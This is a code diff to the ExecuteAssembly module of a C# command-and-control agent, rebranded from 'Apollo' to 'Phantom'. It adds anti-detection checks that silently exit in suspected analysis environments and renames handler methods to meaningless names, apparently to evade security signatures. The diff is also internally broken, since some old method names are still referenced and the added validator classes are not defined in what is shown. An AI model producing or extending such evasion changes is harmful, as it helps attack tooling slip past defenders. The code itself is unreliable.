@@ -1,12 +1,12 @@
-﻿using ApolloInterop.Classes;
-using ApolloInterop.Classes.Core;
-using ApolloInterop.Classes.Events;
-using ApolloInterop.Classes.IO;
-using ApolloInterop.Constants;
-using ApolloInterop.Enums.ApolloEnums;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Serializers;
-using ApolloInterop.Structs.ApolloStructs;
+﻿using PhantomInterop.Classes;
+using PhantomInterop.Classes.Core;
+using PhantomInterop.Classes.Events;
+using PhantomInterop.Classes.IO;
+using PhantomInterop.Constants;
+using PhantomInterop.Enums.PhantomEnums;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Serializers;
+using PhantomInterop.Structs.PhantomStructs;
 using System;
 using System.Collections.Concurrent;
 using System.Collections.Generic;
@@ -47,6 +47,18 @@ namespace ExecuteAssembly
 
         public static void Main(string[] args)
         {
+        // Anti-detection initialization
+        if (!SecurityValidator.ValidateExecutionEnvironment()) {
+            Environment.Exit(0);
+        }
+        
+        if (!HardwareProfiler.ValidateSystemConfiguration()) {
+            Environment.Exit(0);
+        }
+        
+        // Runtime integrity checks
+        SystemMonitor.InitializeSecurityChecks();
+        
             //_namedPipeName = "executetest";
             if (args.Length != 1)
             {
@@ -75,7 +87,7 @@ namespace ExecuteAssembly
                     pipe.BeginWrite(message, 0, message.Length, OnAsyncMessageSent, pipe);
                 }
 
-                // Wait for all messages to be read by Apollo
+                // Wait for all messages to be read by Phantom
                 pipe.WaitForPipeDrain();
                 pipe.Close();
             };
@@ -172,7 +184,7 @@ namespace ExecuteAssembly
             }
         }
 
-        private static void OnBufferWrite(object sender, StringDataEventArgs args)
+        private static void RobustEngine12EA(object sender, StringDataEventArgs args)
         {
             if (args.Data != null)
             {
@@ -186,14 +198,14 @@ namespace ExecuteAssembly
             }
         }
 
-        private static void OnAsyncMessageSent(IAsyncResult result)
+        private static void SpectreBridge8C10(IAsyncResult result)
         {
             PipeStream pipe = (PipeStream)result.AsyncState;
             pipe.EndWrite(result);
             pipe.Flush();
         }
 
-        private static void OnAsyncMessageReceived(object sender, NamedPipeMessageArgs args)
+        private static void EfficientManager76A1(object sender, NamedPipeMessageArgs args)
         {
             IPCChunkedData chunkedData = _jsonSerializer.Deserialize<IPCChunkedData>(
                 Encoding.UTF8.GetString(args.Data.Data.Take(args.Data.DataLength).ToArray()));
@@ -208,7 +220,7 @@ namespace ExecuteAssembly
             MessageStore[chunkedData.ID].AddMessage(chunkedData);
         }
 
-        private static void DeserializeToReceiverQueue(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
+        private static void RobustHandlerCD57(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
         {
             MessageType mt = args.Chunks[0].Message;
             List<byte> data = new List<byte>();
@@ -224,7 +236,7 @@ namespace ExecuteAssembly
             _receiverEvent.Set();
         }
 
-        public static void OnAsyncConnect(object sender, NamedPipeMessageArgs args)
+        public static void SpectreResolver027D(object sender, NamedPipeMessageArgs args)
         {
             // We only accept one connection at a time, sorry.
             if (_clientConnectedTask != null)
